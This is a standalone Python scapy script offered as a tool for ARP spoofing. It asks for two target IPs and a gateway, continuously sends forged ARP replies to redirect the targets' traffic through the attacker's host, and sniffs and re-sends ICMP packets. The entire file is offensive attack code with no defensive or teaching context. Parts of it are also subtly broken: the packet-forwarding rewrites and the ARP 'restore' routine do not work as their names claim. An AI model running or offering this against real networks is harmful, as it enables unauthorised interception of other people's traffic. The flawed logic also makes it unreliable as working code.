from scapy.all import *
import sys
import os
import threading
import signal

def forward_packets(target_ip1, target_ip2, gateway_ip, attacker_ip):
    while True:
        packet = sniff(count=1, filter='icmp', prn=lambda x: x.summary())
        if IP in packet:
            ip_packet = packet[IP]
            if ip_packet.src == target_ip1 and ip_packet.dst == gateway_ip:
                packet[IP].src = gateway_ip
                packet[IP].dst = target_ip1
                send(packet)
                print(f"Forwarding packet from {target_ip1} to {gateway_ip}")
            elif ip_packet.src == target_ip2 and ip_packet.dst == gateway_ip:
                packet[IP].src = gateway_ip
                packet[IP].dst = target_ip2
                send(packet)
                print(f"Forwarding packet from {target_ip2} to {gateway_ip}")
            elif ip_packet.src == gateway_ip and ip_packet.dst == target_ip1:
                packet[IP].src = target_ip1
                packet[IP].dst = gateway_ip
                send(packet)
                print(f"Forwarding packet from {gateway_ip} to {target_ip1}")
            elif ip_packet.src == gateway_ip and ip_packet.dst == target_ip2:
                packet[IP].src = target_ip2
                packet[IP].dst = gateway_ip
                send(packet)
                print(f"Forwarding packet from {gateway_ip} to {target_ip2}")

def spoof_arp(target_ip1, target_ip2, gateway_ip, attacker_ip):
    while True:
        arp_reply1 = ARP(op=2, pdst=target_ip1, psrc=gateway_ip, hwdst=getmacbyip(target_ip1))
        arp_reply2 = ARP(op=2, pdst=target_ip2, psrc=gateway_ip, hwdst=getmacbyip(target_ip2))
        send(arp_reply1)
        send(arp_reply2)

def restore_arp(target_ip1, target_ip2, gateway_ip, attacker_ip):
    arp_restore1 = ARP(op=2, pdst=target_ip1, psrc=gateway_ip, hwdst=getmacbyip(gateway_ip), hwsrc=getmacbyip(attacker_ip))
    arp_restore2 = ARP(op=2, pdst=target_ip2, psrc=gateway_ip, hwdst=getmacbyip(gateway_ip), hwsrc=getmacbyip(attacker_ip))
    send(arp_restore1)
    send(arp_restore2)

def signal_handler(signal, frame):
    restore_arp(target_ip1, target_ip2, gateway_ip, attacker_ip)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

attacker_ip = get_if_addr(conf.iface)

target_ip1 = input("Enter the first target IP address: ")
target_ip2 = input("Enter the second target IP address: ")
gateway_ip = input("Enter the gateway IP address: ")

forward_thread = threading.Thread(target=forward_packets, args=(target_ip1, target_ip2, gateway_ip, attacker_ip))
forward_thread.start()

spoof_thread = threading.Thread(target=spoof_arp, args=(target_ip1, target_ip2, gateway_ip, attacker_ip))
spoof_thread.start()

forward_thread.join()
spoof_thread.join()
